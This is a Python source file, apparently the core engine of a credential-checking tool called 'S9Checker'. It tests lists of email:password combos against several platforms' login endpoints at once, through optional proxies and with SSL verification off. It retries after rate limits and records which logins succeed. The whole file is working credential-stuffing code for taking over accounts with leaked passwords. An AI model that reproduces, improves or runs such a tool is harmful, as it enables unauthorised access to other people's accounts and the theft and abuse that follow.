"""
Async credential checker engine for S9Checker.
Uses a worker pool pattern to test email:password combos against
multiple platforms concurrently with rate limiting and retry logic.
"""

import asyncio
import aiohttp
import json
import time
import logging
from typing import Optional, Callable, Awaitable
from urllib.parse import urlencode

from core.config import (
    DEFAULT_TIMEOUT, MAX_RETRIES_429, RETRY_BACKOFF_BASE,
    HTTP_CONNECTOR_LIMIT, PROGRESS_UPDATE_INTERVAL,
)
from core.platforms import Platform, PLATFORMS
from core.results import ResultsManager, ResultStatus
from core.session import SessionManager
from core.classifier import classify_response

logger = logging.getLogger("S9Checker")


class CredentialChecker:
    """Async multi-platform credential validator using a worker pool."""

    def __init__(self, results_mgr: ResultsManager,
                 progress_callback: Optional[Callable[[dict], Awaitable[None]]] = None,
                 proxy: Optional[str] = None,
                 delay: float = 0.5,
                 ignore_timeouts: bool = False,
                 max_concurrent: Optional[int] = None):
        self.results = results_mgr
        self.progress_cb = progress_callback
        self.proxy = proxy
        self.delay = delay
        self.ignore_timeouts = ignore_timeouts
        self._max_concurrent_override = max_concurrent
        self._stop_flag = False
        self._semaphores: dict[str, asyncio.Semaphore] = {}
        self._rate_limiters: dict[str, float] = {}
        self._session_mgr = SessionManager()

    def stop(self):
        """Signal all workers to stop."""
        self._stop_flag = True

    # -------------------------------------------------------------------
    # HTTP request helper
    # -------------------------------------------------------------------
    async def _send_request(self, session: aiohttp.ClientSession,
                            platform: Platform, data: str,
                            headers: dict, proxy: Optional[str]) -> tuple:
        """Send a single HTTP request and return (status, text, headers, location)."""
        timeout = aiohttp.ClientTimeout(total=platform.timeout or DEFAULT_TIMEOUT)
        async with session.request(
            platform.method,
            platform.login_url,
            data=data,
            headers=headers,
            timeout=timeout,
            proxy=proxy,
            allow_redirects=False,
        ) as resp:
            text = await resp.text()
            return resp.status, text, dict(resp.headers), dict(resp.headers).get("Location", "")

    # -------------------------------------------------------------------
    # Core credential check for one combo on one platform
    # -------------------------------------------------------------------
    async def _check_platform(self, session: aiohttp.ClientSession,
                              email: str, password: str,
                              platform: Platform) -> tuple[str, str]:
        """Test a single credential pair against a single platform."""
        if self._stop_flag:
            return ResultStatus.ERROR, "Stopped"

        # Rate limiting
        now = time.time()
        if platform.name in self._rate_limiters:
            elapsed = now - self._rate_limiters[platform.name]
            min_interval = 1.0 / platform.rate_limit_per_sec
            if elapsed < min_interval:
                await asyncio.sleep(min_interval - elapsed)
        self._rate_limiters[platform.name] = time.time()

        # Create semaphore if not yet created
        if platform.name not in self._semaphores:
            conc = (min(self._max_concurrent_override, platform.max_concurrent)
                    if self._max_concurrent_override else platform.max_concurrent)
            self._semaphores[platform.name] = asyncio.Semaphore(conc)

        async with self._semaphores[platform.name]:
            try:
                await self._session_mgr.get_session_cookies(session, platform)

                # Build HTTP payload
                payload = platform.build_payload(email, password)
                headers = dict(platform.headers)
                proxy = self.proxy or None

                if platform.auth_type == "json":
                    data = json.dumps(payload)
                    headers["Content-Type"] = "application/json"
                else:
                    data = urlencode(payload)
                    headers["Content-Type"] = "application/x-www-form-urlencoded"

                # Retry loop with exponential backoff on HTTP 429
                for attempt in range(MAX_RETRIES_429 + 1):
                    if self._stop_flag:
                        return ResultStatus.ERROR, "Stopped"

                    status, text, headers_resp, location = await self._send_request(
                        session, platform, data, headers, proxy
                    )

                    if status == 429:
                        retry_after = int(headers_resp.get("Retry-After", 5))
                        if attempt < MAX_RETRIES_429:
                            wait = retry_after * (RETRY_BACKOFF_BASE ** attempt)
                            logger.warning(f"[{platform.name}] 429 - retry in {wait}s "
                                           f"(attempt {attempt + 1}/{MAX_RETRIES_429})")
                            self._rate_limiters[platform.name] = time.time() + wait
                            await asyncio.sleep(wait)
                            continue
                        return ResultStatus.RATE_LIMITED, f"HTTP 429 after {MAX_RETRIES_429} retries"

                    break

                # Classify the response
                return classify_response(status, text, headers_resp, location, platform)

            except asyncio.TimeoutError:
                if self.ignore_timeouts:
                    return ResultStatus.ERROR, "Timeout (ignored)"
                return ResultStatus.TIMEOUT, "Request timeout"
            except aiohttp.ClientConnectionError as e:
                return ResultStatus.ERROR, f"Connection error: {str(e)[:50]}"
            except aiohttp.ClientError as e:
                return ResultStatus.ERROR, f"Client error: {str(e)[:50]}"
            except Exception as e:
                return ResultStatus.ERROR, f"Unexpected: {str(e)[:50]}"

    # -------------------------------------------------------------------
    # Main test runner with worker pool
    # -------------------------------------------------------------------
    async def run_test(self, combos: list, platforms: list,
                       progress_interval: float = PROGRESS_UPDATE_INTERVAL):
        """Run credential testing across multiple platforms using a worker pool."""
        self._stop_flag = False
        total = len(combos) * len(platforms)
        completed = 0
        start_time = time.time()
        last_progress = 0

        queue: asyncio.Queue = asyncio.Queue()
        for email, password in combos:
            for pname in platforms:
                queue.put_nowait((email, password, pname))

        num_workers = self._max_concurrent_override or 10

        connector = aiohttp.TCPConnector(limit=HTTP_CONNECTOR_LIMIT, force_close=True, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            await self._session_mgr.prefetch_all(session, platforms)

            async def _worker():
                nonlocal completed
                while not queue.empty() and not self._stop_flag:
                    try:
                        email, password, pname = queue.get_nowait()
                    except asyncio.QueueEmpty:
                        break

                    platform = PLATFORMS.get(pname)
                    if not platform:
                        queue.task_done()
                        continue

                    status, details = await self._check_platform(
                        session, email, password, platform
                    )
                    await self.results.add_result(email, password, pname, status, details)

                    queue.task_done()
                    completed += 1

                    now = time.time()
                    if now - last_progress >= progress_interval or completed == total:
                        elapsed = now - start_time
                        speed = completed / elapsed if elapsed > 0 else 0
                        stats = self.results.get_stats()
                        info = {
                            "completed": completed,
                            "total": total,
                            "valid": stats["valid"],
                            "invalid": stats["invalid"],
                            "errors": stats["errors"],
                            "speed": round(speed, 1),
                            "elapsed": elapsed,
                            "percent": int(completed / total * 100) if total > 0 else 0,
                        }
                        if self.progress_cb:
                            try:
                                await self.progress_cb(info)
                            except Exception:
                                pass

                    if self.delay > 0:
                        await asyncio.sleep(self.delay)

            workers = [asyncio.create_task(_worker()) for _ in range(num_workers)]
            await asyncio.gather(*workers, return_exceptions=True)

        # Final progress update
        if self.progress_cb:
            elapsed = time.time() - start_time
            speed = completed / elapsed if elapsed > 0 else 0
            stats = self.results.get_stats()
            await self.progress_cb({
                "completed": completed,
                "total": total,
                "valid": stats["valid"],
                "invalid": stats["invalid"],
                "errors": stats["errors"],
                "speed": round(speed, 1),
                "elapsed": elapsed,
                "percent": 100 if total > 0 else 0,
                "done": True,
            })
